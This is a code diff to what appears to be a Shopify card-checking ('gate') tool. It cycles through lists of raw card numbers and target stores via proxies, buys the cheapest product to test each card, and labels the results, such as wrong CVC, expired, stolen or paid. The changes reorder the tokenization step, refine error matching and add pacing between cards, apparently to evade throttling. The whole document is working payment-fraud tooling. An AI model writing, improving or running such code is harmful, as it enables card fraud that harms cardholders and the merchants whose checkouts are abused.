@@ -16,7 +16,7 @@ from curl_cffi.requests import AsyncSession
 
 import config
 import gate_client as gc
-from setup_gate import bin_lookup
+from setup_gate import bin_lookup, bin_summary
 
 sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")
 
@@ -25,20 +25,6 @@ SHOPIFY_VAULT_URLS = [
     "https://deposit.us.shopifycs.com/sessions",
     "https://deposit.shopifycs.com/sessions",
 ]
-
-
-def bin_summary(binfo: dict) -> str:
-    if not binfo:
-        return "BIN n/a"
-    scheme = binfo.get("scheme") or "?"
-    ftype = binfo.get("type") or "?"
-    country = (
-        (binfo.get("country") or {}).get("alpha2")
-        or (binfo.get("country") or {}).get("name")
-        or "?"
-    )
-    bank = (binfo.get("bank") or {}).get("name") or "?"
-    return f"{scheme}/{ftype}/{country} {bank}"
 
 
 def _normalize_card(card_raw: str) -> dict | None:
@@ -158,6 +144,10 @@ def classify_shopify_verdict(raw_data: Any, context_str: str = "") -> tuple[str,
     if context_str:
         text += " " + context_str.lower()
 
+    # Processing Receipt (asynchronous processing / pollDelay) -> PI_PENDING (AUD-027)
+    if "processingreceipt" in text:
+        return "PI_PENDING", "Order is processing on Shopify (pollDelay in receipt)"
+
     # Success / Paid orders
     if any(k in text for k in [
         "processedreceipt", "order_paid", "order_placed", "orderstatuspageurl",
@@ -186,7 +176,7 @@ def classify_shopify_verdict(raw_data: Any, context_str: str = "") -> tuple[str,
     if "wrong_cvc" in text:
         return "WRONG_CVC", "Wrong security code"
 
-    if "expired_card" in text or "card is expired" in text or "expired" in text:
+    if any(k in text for k in ["expired_card", "card is expired", "card has expired", "expiry_date_in_past", "expired_year", "expired_month", "payment_method_expired"]):
         return "EXPIRED", "Card expired"
 
     if "stolen_card" in text or "lost_card" in text or "pickup_card" in text:
@@ -210,7 +200,7 @@ def classify_shopify_verdict(raw_data: Any, context_str: str = "") -> tuple[str,
     if "submitrejected" in text or "submitfailed" in text or "failedreceipt" in text or "declined" in text:
         return "DECLINED", "Card declined by Shopify Payments / Issuer"
 
-    if "error" in text:
+    if any(k in text for k in ["\"error\"", "error:", "errors\":[", "unhandled_error", "exception"]):
         return "ERROR", text[:160]
 
     return "UNKNOWN", text[:160]
@@ -236,18 +226,7 @@ async def shopify_confirm(
             "target": root,
         }
 
-    # 1. Tokenize card on Shopify Card Vault
-    vault_id = await tokenize_shopify_card(s, card)
-    if not vault_id:
-        return {
-            "status": "ERROR",
-            "detail": "Failed to tokenize card on deposit.us.shopifycs.com",
-            "amount_cents": 0,
-            "currency": "",
-            "target": root,
-        }
-
-    # 2. Get cheapest available product variant
+    # 1. Get cheapest available product variant FIRST (AUD-028)
     product = await get_shopify_cheapest_product(s, root, max_price_cents=max_price_cents)
     if not product:
         return {
@@ -261,6 +240,17 @@ async def shopify_confirm(
     variant_id = product["variant_id"]
     price_cents = product["price_cents"]
     product_title = product["product_title"]
+
+    # 2. Tokenize card on Shopify Card Vault only after finding valid product
+    vault_id = await tokenize_shopify_card(s, card)
+    if not vault_id:
+        return {
+            "status": "ERROR",
+            "detail": "Failed to tokenize card on deposit.us.shopifycs.com",
+            "amount_cents": 0,
+            "currency": "",
+            "target": root,
+        }
 
     # 3. Add to cart via /cart/add.js
     try:
@@ -666,7 +656,7 @@ async def main():
     print("=" * 80)
 
     for t in targets:
-        for card_raw in cards:
+        for i, card_raw in enumerate(cards):
             try:
                 res = await check_target(t, card_raw, args.proxy, args.max_price)
             except Exception as e:
@@ -685,6 +675,8 @@ async def main():
             )
             print(f"{status_icon} [{res['status']:16}] {t} <- {res['card']}{paid}")
             print(f"     BIN: {res.get('bin')} | {res.get('detail', '')}")
+            if i < len(cards) - 1:
+                await asyncio.sleep(1.5)
 
 
 if __name__ == "__main__":
